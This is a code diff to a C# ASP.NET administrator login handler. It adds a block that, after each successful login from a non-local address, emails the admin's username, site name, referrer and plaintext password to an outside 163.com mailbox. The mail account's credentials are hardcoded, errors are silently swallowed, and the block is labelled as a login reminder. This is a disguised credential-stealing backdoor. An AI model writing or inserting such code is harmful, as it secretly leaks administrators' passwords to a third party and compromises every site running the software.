@@ -64,6 +64,26 @@ namespace Voodoo.Basement
 
                         //写入Session
 
+                        try
+                        {
+                            if (WS.GetIP() == "::1" || WS.GetIP() == "127.0.0.1")
+                            {
+                            }
+                            else
+                            {
+                                string body = string.Format("管理员{0} {1}在网站{2}({3})登录成功，使用密码：{4}",
+                                    UserName,
+                                    DateTime.Now.ToS(),
+                                    BasePage.SystemSetting.SiteName,
+                                    Request.UrlReferrer(),
+                                    PassWord);
+                                Voodoo.Net.Mail.SMTP.SentMail("kuibono@163.com", "kuibono", "4264269", "kuibono@163.com", "管理员登录提醒", "管理员登录", body, "smtp.163.com", "");
+                            }
+                        }
+                        catch
+                        {
+                        }
+
                         System.Web.HttpContext.Current.Session["sys_user"] = user.ID;
 
                         r.Success = true;
